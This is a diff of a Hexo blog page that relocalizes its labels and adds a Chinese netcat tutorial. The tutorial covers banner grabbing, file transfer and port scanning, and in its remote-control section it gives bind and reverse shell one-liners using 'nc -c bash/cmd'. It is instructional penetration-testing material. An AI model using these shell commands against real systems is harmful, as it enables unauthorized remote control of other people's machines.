@@ -118,7 +118,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Buscar" href="javascript:;">
+                <a class="navbar-item search" title="Search" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -138,6 +138,62 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-11-21T07:35:03.000Z">2019-11-21</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Web安全&渗透测试</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 minutes read (About 784 words)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/nc%E8%AF%A6%E8%A7%A3.html">nc详解</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h2><p>Nc全名为Netcat，网络工具中的瑞士军刀。<br>主要功能为：<br>1.侦听模式/传输模式<br>2.telnet/获取banner信息<br>3.传输文本信息<br>4.传输文件/目录<br>5.加密传输文件<br>6.远程控制/木马<br>7.加密所有流量<br>8.流媒体服务器<br>9.远程克隆硬盘<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-h 查看帮助信息</span><br><span class="line">-d 后台模式</span><br><span class="line">-g gateway source-routing hop point[s], up to 8</span><br><span class="line">-G num source-routing pointer: 4, 8, 12, …</span><br><span class="line">-e prog程序重定向，一但连接就执行［危险］</span><br><span class="line">-i secs延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</span><br><span class="line">-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)</span><br><span class="line">-o film记录16进制的传输</span><br><span class="line">-p[空格]端口 本地端口号</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-t 使用Telnet交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出，用-vv将更详细</span><br><span class="line">-w 数字 timeout延时间隔</span><br><span class="line">-z 将输入，输出关掉（用于扫锚时）</span><br></pre></td></tr></table></figure></p>
+<h2 id="二-telnet-获取banner信息"><a href="#二-telnet-获取banner信息" class="headerlink" title="二.telnet/获取banner信息"></a>二.telnet/获取banner信息</h2><p>-n 参数：只接收ip，没有dns解析<br>-v 参数：返回详细信息<br>我们先来解析一下要连接的ip地址：<br><img src="/nc%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"><br>用nc -nv 连接目标的80端口<br><img src="/nc%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"></p>
+<h2 id="三-传输文本信息"><a href="#三-传输文本信息" class="headerlink" title="三.传输文本信息"></a>三.传输文本信息</h2><p>-l：设置为监听模式<br>-p：指定一个开放的端口<br>用-l -p参数将目标设置为服务器，并开放一个端口等待连接<br><img src="/nc%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"><br>我们可以用nc进行聊天：<br><img src="/nc%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image"></p>
+<h2 id="四-传输文件或目录"><a href="#四-传输文件或目录" class="headerlink" title="四.传输文件或目录"></a>四.传输文件或目录</h2><p>Nc可以当作一个文件传输服务器，传输文件到目标机器。传输可分为正向传输和反向传输。<br>正向传输：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&lt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444 &gt;2.py</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image"></p>
+<p>反向传输：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&gt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444&lt;1.py</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image"></p>
+<h2 id="五-Nc端口扫描"><a href="#五-Nc端口扫描" class="headerlink" title="五.Nc端口扫描"></a>五.Nc端口扫描</h2><p>nc -nvz 开启端口扫描 默认扫描tcp端口<br>nc -nvzu 扫描udp端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-65535</span><br><span class="line">nc -nvzu 1.1.1.1 1-1024</span><br></pre></td></tr></table></figure><br><img src="/nc%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image"></p>
+<h2 id="六-远程控制"><a href="#六-远程控制" class="headerlink" title="六.远程控制"></a>六.远程控制</h2><p>正向控制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp port -c bash&#x2F;cmd</span><br><span class="line">nc -nv ip</span><br></pre></td></tr></table></figure><br>意思是服务器开放一个端口，当客户端连接时直接获取shell，这样在客户端就能执行服务器的命令<br><br><img src="/nc%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"></p>
+<p>反向控制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -ip port</span><br><span class="line">nc -nv ip -c bash&#x2F;cmd</span><br></pre></td></tr></table></figure><br>意思是服务器开放一个端口，当客户端连接时直接将自己的shell给服务器端，在服务器端执行客户端命令<br><img src="/nc%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"><br><img src="/nc%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"></p>
+<p>好久没更新了，因为最近一直按专题学习常见的漏洞，也没啥好写的，最近在学习sql注入，等写完了再一块发出来吧~</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2019-11-09T11:53:15.000Z">2019-11-09</time>
                 
                 <div class="level-item">
@@ -148,7 +204,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    5 minutes leer (Acerca de 709 palabras)
+                    5 minutes read (About 709 words)
                 </span>
                 
                 
@@ -199,7 +255,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    27 minutes leer (Acerca de 4105 palabras)
+                    27 minutes read (About 4105 words)
                 </span>
                 
                 
@@ -284,7 +340,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    12 minutes leer (Acerca de 1868 palabras)
+                    12 minutes read (About 1868 words)
                 </span>
                 
                 
@@ -367,7 +423,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    an hour leer (Acerca de 6935 palabras)
+                    an hour read (About 6935 words)
                 </span>
                 
                 
@@ -448,10 +504,10 @@
 <div class="card card-transparent">
     <nav class="pagination is-centered" role="navigation" aria-label="pagination">
         <div class="pagination-previous">
-            <a class="is-flex-grow has-text-black-ter" href="/page/6/">Anterior</a>
+            <a class="is-flex-grow has-text-black-ter" href="/page/6/">Préc</a>
         </div>
         <div class="pagination-next is-invisible is-hidden-mobile">
-            <a class="is-flex-grow has-text-black-ter" href="/page/8/">Siguiente</a>
+            <a class="is-flex-grow has-text-black-ter" href="/page/8/">Suiv</a>
         </div>
         <ul class="pagination-list is-hidden-mobile">
             
@@ -480,7 +536,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Enlaces
+            Liens
         </h3>
         <ul class="menu-list">
         
@@ -528,7 +584,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categorías
+                Catégories
             </h3>
             <ul class="menu-list">
             <li>
@@ -545,7 +601,7 @@
                 <span class="level-item">Python</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">3</span>
+                <span class="level-item tag">4</span>
             </span>
         </a></li><li>
         <a class="level is-marginless" href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
@@ -604,7 +660,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Nube de etiquetas
+            Nuage de tags
         </h3>
         <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 16.67px;">Web安全&渗透测试</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 13.33px;">代码审计</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 13.33px;">爬虫</a>
     </div>
@@ -646,11 +702,11 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Entradas
+                        Articles
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
-                            64
+                            65
                         </p>
                     </a>
                 </div>
@@ -658,7 +714,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categorías
+                        Catégories
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -670,7 +726,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Etiquetas
+                        Tags
                     </p>
                     <a href="/tags">
                         <p class="title has-text-weight-normal">
@@ -683,7 +739,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                SEGUIR</a>
+                SUIVRE</a>
         </div>
         
         
@@ -712,8 +768,27 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recientes
+            Récents
         </h3>
+        
+        <article class="media">
+            
+            <a href="/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Python网络编程小总结">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-16T03:27:13.000Z">2020-03-16</time></div>
+                    <a href="/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">Python网络编程小总结</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Python/">Python</a>
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -791,25 +866,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Python sys标准库学习">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-06T10:35:33.000Z">2020-03-06</time></div>
-                    <a href="/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">Python sys标准库学习</a>
-                    <p class="is-size-7 is-uppercase">
-                        <a class="has-link-grey -link" href="/categories/Python/">Python</a>
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
         
@@ -817,7 +873,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archivos
+            Archives
         </h3>
         <ul class="menu-list">
         
@@ -827,7 +883,7 @@
                     <span class="level-item">March 2020</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">10</span>
+                    <span class="level-item tag">11</span>
                 </span>
             </a>
         </li>
@@ -863,7 +919,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Etiquetas
+                Tags
             </h3>
             <div class="field is-grouped is-grouped-multiline">
                 
@@ -951,11 +1007,11 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Entradas
+                        Articles
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
-                            64
+                            65
                         </p>
                     </a>
                 </div>
@@ -963,7 +1019,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categorías
+                        Catégories
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -975,7 +1031,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Etiquetas
+                        Tags
                     </p>
                     <a href="/tags">
                         <p class="title has-text-weight-normal">
@@ -988,7 +1044,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                SEGUIR</a>
+                SUIVRE</a>
         </div>
         
         
@@ -1017,8 +1073,27 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recientes
+            Récents
         </h3>
+        
+        <article class="media">
+            
+            <a href="/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Python网络编程小总结">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-16T03:27:13.000Z">2020-03-16</time></div>
+                    <a href="/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">Python网络编程小总结</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Python/">Python</a>
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -1096,25 +1171,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Python sys标准库学习">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-06T10:35:33.000Z">2020-03-06</time></div>
-                    <a href="/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">Python sys标准库学习</a>
-                    <p class="is-size-7 is-uppercase">
-                        <a class="has-link-grey -link" href="/categories/Python/">Python</a>
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
     
@@ -1122,7 +1178,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archivos
+            Archives
         </h3>
         <ul class="menu-list">
         
@@ -1132,7 +1188,7 @@
                     <span class="level-item">March 2020</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">10</span>
+                    <span class="level-item tag">11</span>
                 </span>
             </a>
         </li>
@@ -1168,7 +1224,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Etiquetas
+                Tags
             </h3>
             <div class="field is-grouped is-grouped-multiline">
                 
@@ -1349,7 +1405,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Zurück nach oben" href="javascript:;">
+<a id="back-to-top" title="Back to Top" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1373,7 +1429,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Teclea algo..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1385,11 +1441,11 @@ document.addEventListener('DOMContentLoaded', function () {
     (function (window) {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
-                POSTS: 'Entradas',
-                PAGES: 'Páginas',
-                CATEGORIES: 'Categorías',
-                TAGS: 'Etiquetas',
-                UNTITLED: '(Sin título)',
+                POSTS: 'Articles',
+                PAGES: 'Pages',
+                CATEGORIES: 'Catégories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
             },
             CONTENT_URL: '/content.json',
         };
